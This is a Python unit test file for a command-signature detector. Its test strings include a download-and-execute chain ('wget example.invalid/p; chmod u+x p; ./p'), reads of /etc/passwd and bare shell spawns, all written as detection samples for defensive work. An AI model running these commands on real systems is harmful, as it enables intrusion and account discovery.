from pathlib import Path
import unittest

from match_signatures import load_rules, match

ROOT = Path(__file__).resolve().parents[1]


class AdditionalSignatureTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.rules = load_rules(ROOT / 'signatures/rules.yaml')

    def check(self, rid, commands, expected):
        for cmd in commands:
            with self.subTest(rule=rid, command=cmd):
                hits = match(self.rules, [('2026-11-07T00:00:00Z', cmd)])
                self.assertEqual(rid in hits, expected)

    def test_positive(self):
        for rid, cases in {
            'B18': ['cat /etc/passwd', '/bin/cat -n -- "/etc/passwd"',
                    'busybox cat /etc/passwd', 'LC_ALL=C getent passwd',
                    'cat /etc/passwd | cut -d: -f1'],
            'B19': ['sh', '/bin/sh', 'busybox sh', '/bin/busybox ash',
                    'bash -i', 'dash -l', 'sh -il', 'sh --', 'ping ;sh',
                    'LC_ALL=C sh', 'true && sh'],
            'B20': ['ls', 'ls /home', '/bin/ls -la /tmp',
                    'busybox ls -alh /home', 'LC_ALL=C ls -- "my dir"'],
        }.items():
            self.check(rid, cases, True)

    def test_negative(self):
        for rid, cases in {
            'B18': ['echo "cat /etc/passwd"', 'cat /etc/passwd.bak',
                    'cat --help /etc/passwd', 'cat /etc/passwd --version',
                    'cat /tmp/etc/passwd', 'cat $FILE', 'getent passwd root',
                    'getent --help passwd', 'cat /etc/shadow',
                    'cat /tmp/file > /etc/passwd', 'cat /etc/passwd &&'],
            'B19': ['shell', 'enable', 'system', 'linuxshell',
                    'echo "sh"', 'printf "%s" "ping ;sh"',
                    'sh --help', 'sh --version', 'sh -n script', 'sh -c "id"',
                    'sh /tmp/p', 'sh $SCRIPT', '/tmp/sh', 'mysh',
                    'sh < script', 'echo $(sh)', 'sh |'],
            'B20': ['echo "ls /home"', 'ls --help', 'ls --version',
                    'ls $DIR', 'ls /home/*', 'false_ls /home', 'ls -z /home',
                    'ls /home > output', 'ls -I /home', 'ls $(pwd)'],
        }.items():
            self.check(rid, cases, False)
        for rid in ('B18', 'B19', 'B20'):
            self.check(rid, ['# cat /etc/passwd; sh; ls',
                            'echo "cat /etc/passwd; sh; ls"',
                            "echo 'unterminated; sh; ls", 'x' * 131073], False)

    def test_counts_and_existing_rule_separation(self):
        rows = [('2026-11-07T00:00:00Z', 'cat /etc/passwd; cat /etc/passwd; sh; ls'),
                ('2026-11-07T00:00:01Z', 'cat /etc/passwd; sh; ls')]
        hits = match(self.rules, rows)
        for rid in ('B18', 'B19', 'B20'):
            self.assertEqual(hits[rid], (rows[0][0], 2))
        self.assertNotIn('B02', hits)
        self.assertNotIn('B10', hits)

    def test_old_rules_identical(self):
        old = [r for r in self.rules if r['id'] not in {'B18', 'B19', 'B20'}]
        rows = [('2026-11-07T00:00:00Z', 'sh; cat /etc/passwd; ls /home'),
                ('2026-11-07T00:00:01Z', 'wget example.invalid/p; chmod u+x p; ./p')]
        self.assertEqual(match(old, rows), {k: v for k, v in match(self.rules, rows).items()
                                         if k not in {'B18', 'B19', 'B20'}})


if __name__ == '__main__':
    unittest.main()
